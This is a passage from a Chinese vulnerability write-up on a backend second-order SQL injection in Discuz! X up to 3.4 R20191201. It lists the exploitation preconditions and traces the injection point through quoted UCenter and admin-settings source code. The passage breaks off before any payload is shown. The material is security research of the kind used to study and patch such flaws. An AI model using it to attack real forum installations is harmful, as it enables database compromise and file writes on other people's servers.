<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="discuz-x-系列全版本-后台sql注入漏洞"><span class="csDE05BCC">Discuz! X </span><span class="csECDA2D3">系列全版本</span><span class="csDE05BCC"> </span><span class="csECDA2D3">后台</span><span class="csDE05BCC">Sql</span><span class="csECDA2D3">注入漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">利用条件：</span></p><p class="cs40DD2BC9"><span class="cs8926E06">1.</span><span class="cs9C1B1871">知道网站的绝对路径</span></p><p class="cs40DD2BC9"><span class="cs8926E06">2.secure_file_priv</span><span class="cs9C1B1871">的值为空</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Discuz!X </span><span class="cs9C1B1871">系列全版本</span><span class="cs8926E06"> </span><span class="cs9C1B1871">截止到</span><span class="cs8926E06"> Discuz!X 3.4 R20191201 UTF-8</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">挖过</span><span class="cs8926E06">discuz </span><span class="cs9C1B1871">漏洞的都知道</span><span class="cs8926E06"> </span><span class="cs9C1B1871">它会对大部分传参进来的值进行过滤和校验</span><span class="cs8926E06"> </span><span class="cs9C1B1871">，所以当时找了一个二次注入的点</span></p><p class="cs40DD2BC9"><span class="cs8926E06">uc_server\model\base.php 37</span><span class="cs9C1B1871">行</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[UCenter] (C)2001-2099 Comsenz Inc.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">This is NOT a freeware, use is subject to license terms</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$Id: base.php 1167 2014-11-03 03:06:21Z hypowang $</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">*/</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">!defined(&#39;IN_UC&#39;) &amp;&amp; exit(&#39;Access Denied&#39;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">class base {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var $sid;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var $time;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var $onlineip;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var $db;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var $view;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var $user = array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var $settings = array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var $cache = array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var $app = array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var $lang = array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var $input = array();</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;function __construct() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;base();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;function base() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;init_var();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;init_db();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;init_cache();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;init_app();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;init_user();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;init_template();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;init_note(); //</span><span class="cs7FFD2630">跟进</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;init_mail();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">uc_server\model\base.php 198</span><span class="cs9C1B1871">行</span><span class="cs8926E06"> </span><span class="cs9C1B1871">开始</span></p><p class="cs3A447A38"><span class="cs9FB05234">function init_note() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;if($this-&gt;note_exists()) { //</span><span class="cs7FFD2630">跟进</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;load(&#39;note&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_ENV[&#39;note&#39;]-&gt;send();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> }</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> function note_exists() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;$noteexists = $this-&gt;db-&gt;result_first(&quot;SELECT value FROM &quot;.UC_DBTABLEPRE.&quot;vars WHERE name=&#39;noteexists&quot;.UC_APPID.&quot;&#39;&quot;); //</span><span class="cs7FFD2630">从配置文件取值</span><span class="cs9FB05234">UC_APPID &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return FALSE;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return TRUE;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> }</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">查找</span><span class="cs8926E06">UC_APPID</span></p><p class="cs40DD2BC9"><span class="cs8926E06">source\admincp\admincp_setting.php 2523</span><span class="cs9C1B1871">行</span></p><p class="cs3A447A38"><span class="cs9FB05234">$settingnew = $_GET[&#39;settingnew&#39;]; //</span><span class="cs7FFD2630">传入</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if($operation == &#39;credits&#39;) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$extcredits_exists = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach($settingnew[&#39;extcredits&#39;] as $val) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(isset($val[&#39;available&#39;]) &amp;&amp; $val[&#39;available&#39;] == 1) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$extcredits_exists = 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!$extcredits_exists) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cpmsg(&#39;setting_extcredits_must_available&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($settingnew[&#39;report_reward&#39;]) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$settingnew[&#39;report_reward&#39;][&#39;min&#39;] = intval($settingnew[&#39;report_reward&#39;][&#39;min&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$settingnew[&#39;report_reward&#39;][&#39;max&#39;] = intval($settingnew[&#39;report_reward&#39;][&#39;max&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($settingnew[&#39;report_reward&#39;][&#39;min&#39;] &gt; $settingnew[&#39;report_reward&#39;][&#39;max&#39;]) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unset($settingnew[&#39;report_reward&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($settingnew[&#39;report_reward&#39;][&#39;min&#39;] == $settingnew[&#39;report_reward&#39;][&#39;max&#39;]) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$settingnew[&#39;report_reward&#39;] = array(&#39;min&#39; =&gt; &#39;&#39;, &#39;max&#39; =&gt; &#39;&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$settingnew[&#39;report_reward&#39;] = serialize($settingnew[&#39;report_reward&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$settingnew[&#39;creditspolicy&#39;] = @dunserialize($setting[&#39;creditspolicy&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$settingnew[&#39;creditspolicy&#39;][&#39;lowerlimit&#39;] = array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach($settingnew[&#39;lowerlimit&#39;] as $key =&gt; $value) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($settingnew[&#39;extcredits&#39;][$key][&#39;available&#39;]) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$settingnew[&#39;creditspolicy&#39;][&#39;lowerlimit&#39;][$key] = (float)$value;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unset($settingnew[&#39;lowerlimit&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if($operation == &#39;uc&#39; &amp;&amp; is_writeable(&#39;./config/config_ucenter.php&#39;) &amp;&amp; $isfounder) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;require_once &#39;./config/config_ucenter.php&#39;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ucdbpassnew = $settingnew[&#39;uc&#39;][&#39;dbpass&#39;] == &#39;********&#39; ? addslashes(UC_DBPW) : addslashes($settingnew[&#39;uc&#39;][&#39;dbpass&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$settingnew[&#39;uc&#39;][&#39;key&#39;] = addslashes($settingnew[&#39;uc&#39;][&#39;key&#39;] == &#39;********&#39; ? addslashes(UC_KEY) : $settingnew[&#39;uc&#39;][&#39;key&#39;]);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(function_exists(&quot;mysql_connect&quot;) &amp;&amp; ini_get(&quot;mysql.allow_local_infile&quot;)==&quot;1&quot; &amp;&amp; constant(&quot;UC_DBHOST&quot;) != $settingnew[&#39;uc&#39;][&#39;dbhost&#39;]){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cpmsg(&#39;uc_config_load_data_local_infile_error&#39;, &#39;&#39;, &#39;error&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($settingnew[&#39;uc&#39;][&#39;connect&#39;]) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$uc_dblink = function_exists(&quot;mysql_connect&quot;) ? @mysql_connect($settingnew[&#39;uc&#39;][&#39;dbhost&#39;], $settingnew[&#39;uc&#39;][&#39;dbuser&#39;], $ucdbpassnew, 1) : new mysqli($settingnew[&#39;uc&#39;][&#39;dbhost&#39;], $settingnew[&#39;uc&#39;][&#39;dbuser&#39;], $ucdbpassnew);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!$uc_dblink) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cpmsg(&#39;uc_database_connect_error&#39;, &#39;&#39;, &#39;error&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(function_exists(&quot;mysql_connect&quot;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mysql_close($uc_dblink);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$uc_dblink-&gt;close();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$fp = fopen(&#39;./config/config_ucenter.php&#39;, &#39;r&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$configfile = fread($fp, filesize(&#39;./config/config_ucenter.php&#39;));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$configfile = trim($configfile);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$configfile = substr($configfile, -2) == &#39;?&gt;&#39; ? substr($configfile, 0, -2) : $configfile;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose($fp);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$connect = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$settingnew[&#39;uc&#39;] = daddslashes($settingnew[&#39;uc&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($settingnew[&#39;uc&#39;][&#39;connect&#39;]) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$connect = &#39;mysql&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$samelink = ($dbhost == $settingnew[&#39;uc&#39;][&#39;dbhost&#39;] &amp;&amp; $dbuser == $settingnew[&#39;uc&#39;][&#39;dbuser&#39;] &amp;&amp; $dbpw == $ucdbpassnew);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$samecharset = !($dbcharset == &#39;gbk&#39; &amp;&amp; UC_DBCHARSET == &#39;latin1&#39; || $dbcharset == &#39;latin1&#39; &amp;&amp; UC_DBCHARSET == &#39;gbk&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$configfile = str_replace(&quot;define(&#39;UC_DBHOST&#39;, &#39;&quot;.addslashes(UC_DBHOST).&quot;&#39;)&quot;, &quot;define(&#39;UC_DBHOST&#39;, &#39;&quot;.$settingnew[&#39;uc&#39;][&#39;dbhost&#39;].&quot;&#39;)&quot;, $configfile);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$configfile = str_replace(&quot;define(&#39;UC_DBUSER&#39;, &#39;&quot;.addslashes(UC_DBUSER).&quot;&#39;)&quot;, &quot;define(&#39;UC_DBUSER&#39;, &#39;&quot;.$settingnew[&#39;uc&#39;][&#39;dbuser&#39;].&quot;&#39;)&quot;, $configfile);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$configfile = str_replace(&quot;define(&#39;UC_DBPW&#39;, &#39;&quot;.addslashes(UC_DBPW).&quot;&#39;)&quot;, &quot;define(&#39;UC_DBPW&#39;, &#39;&quot;.$ucdbpassnew.&quot;&#39;)&quot;, $configfile);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!preg_match(&#39;/^[\w\d\_]+$/&#39;, $settingnew[&#39;uc&#39;][&#39;dbtablepre&#39;]) || !preg_match(&#39;/^[\w\d\_]+$/&#39;, $settingnew[&#39;uc&#39;][&#39;dbname&#39;])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cpmsg(&#39;uc_config_write_error&#39;, &#39;&#39;, &#39;error&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$configfile = str_replace(&quot;define(&#39;UC_DBNAME&#39;, &#39;&quot;.addslashes(UC_DBNAME).&quot;&#39;)&quot;, &quot;define(&#39;UC_DBNAME&#39;, &#39;&quot;.$settingnew[&#39;uc&#39;][&#39;dbname&#39;].&quot;&#39;)&quot;, $configfile);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$configfile = str_replace(&quot;define(&#39;UC_DBTABLEPRE&#39;, &#39;&quot;.addslashes(UC_DBTABLEPRE).&quot;&#39;)&quot;, &quot;define(&#39;UC_DBTABLEPRE&#39;, &#39;`&quot;.$settingnew[&#39;uc&#39;][&#39;dbname&#39;].&#39;`.&#39;.$settingnew[&#39;uc&#39;][&#39;dbtablepre&#39;].&quot;&#39;)&quot;, $configfile);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$configfile = str_replace(&quot;define(&#39;UC_CONNECT&#39;, &#39;&quot;.addslashes(UC_CONNECT).&quot;&#39;)&quot;, &quot;define(&#39;UC_CONNECT&#39;, &#39;&quot;.$connect.&quot;&#39;)&quot;, $configfile);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$configfile = str_replace(&quot;define(&#39;UC_KEY&#39;, &#39;&quot;.addslashes(UC_KEY).&quot;&#39;)&quot;, &quot;define(&#39;UC_KEY&#39;, &#39;&quot;.$settingnew[&#39;uc&#39;][&#39;key&#39;].&quot;&#39;)&quot;, $configfile);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$configfile = str_replace(&quot;define(&#39;UC_API&#39;, &#39;&quot;.addslashes(UC_API).&quot;&#39;)&quot;, &quot;define(&#39;UC_API&#39;, &#39;&quot;.$settingnew[&#39;uc&#39;][&#39;api&#39;].&quot;&#39;)&quot;, $configfile);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$configfile = str_replace(&quot;define(&#39;UC_IP&#39;, 